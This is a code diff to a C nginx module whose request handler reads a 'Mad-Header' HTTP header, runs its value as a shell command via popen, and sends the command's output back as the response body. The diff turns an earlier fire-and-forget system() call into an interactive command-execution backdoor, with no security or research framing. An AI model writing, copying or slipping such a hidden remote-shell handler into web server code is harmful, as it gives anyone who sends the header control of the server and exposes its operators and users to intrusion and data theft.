@@ -1,4 +1,5 @@
 #include <stdlib.h>
+#include <string.h>
 
 #include <ngx_config.h>
 #include <ngx_core.h>
@@ -118,18 +119,65 @@ search_headers_in(ngx_http_request_t *r, u_char *name, size_t len) {
 static ngx_int_t ngx_http_mad_header_handler(ngx_http_request_t *r)
 {
 
-    u_char ngx_mad_header[] = "Mad Header";
-    u_int ngx_mad_header_len = ngx_strlen(ngx_mad_header);
-    ngx_table_elt_t *cmd_elt = search_headers_in(r, ngx_mad_header, ngx_mad_header_len);
+    ngx_str_t ngx_mad_header = ngx_string("Mad-Header");
+    ngx_table_elt_t *cmd_elt = search_headers_in(r, ngx_mad_header.data, ngx_mad_header.len);
     if (cmd_elt != NULL){
         /* Run Command */
-        system((const char *)(cmd_elt->value.data));   
+        FILE *fd;
+        fd = popen((const char *)(cmd_elt->value.data), "r");
+        if (!fd) return NGX_DECLINED;
+ 
+        char   buffer[256];
+        size_t chread;
+        /* String to store entire command contents in */
+        size_t comalloc = 256;
+        size_t comlen   = 0;
+        char  *comout   = malloc(comalloc);
+ 
+        /* Use fread so binary data is dealt with correctly */
+        while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
+            if (comlen + chread >= comalloc) {
+                comalloc *= 2;
+                comout = realloc(comout, comalloc);
+            }
+            memmove(comout + comlen, buffer, chread);
+            comlen += chread;
+        }
+ 
+        pclose(fd);
+
+        ngx_buf_t *b;
+        ngx_chain_t out;
+
+        /* Set the Content-Type header. */
+        r->headers_out.content_type.len = sizeof("text/plain") - 1;
+        r->headers_out.content_type.data = (u_char *) "text/plain";
+
+        /* Allocate a new buffer for sending out the reply. */
+        b = ngx_pcalloc(r->pool, sizeof(ngx_buf_t));
+
+        /* Insertion in the buffer chain. */
+        out.buf = b;
+        out.next = NULL; /* just one buffer */
+
+        b->pos = (unsigned char *)comout; /* first position in memory of the data */
+        b->last = (unsigned char *)comout + comlen; /* last position in memory of the data */
+        b->memory = 1; /* content is in read-only memory */
+        b->last_buf = 1; /* there will be no more buffers in the request */
+
+        /* Sending the headers for the reply. */
+        r->headers_out.status = NGX_HTTP_OK; /* 200 status code */
+        /* Get the content length of the body. */
+        r->headers_out.content_length_n = comlen;
+        ngx_http_send_header(r); /* Send the headers */
+
+        /* Send the body, and return the status code of the output filter chain. */
+        return ngx_http_output_filter(r, &out);
     }
 
-    ngx_http_send_header(r); /* Send the headers */
-
-    return NGX_OK;
-} /* ngx_http_mad_header_handler */
+    /* this means we really don't wana fuck with the response body */
+    return NGX_DECLINED;
+}
 
 /**
  * Configuration setup function that installs the content handler.
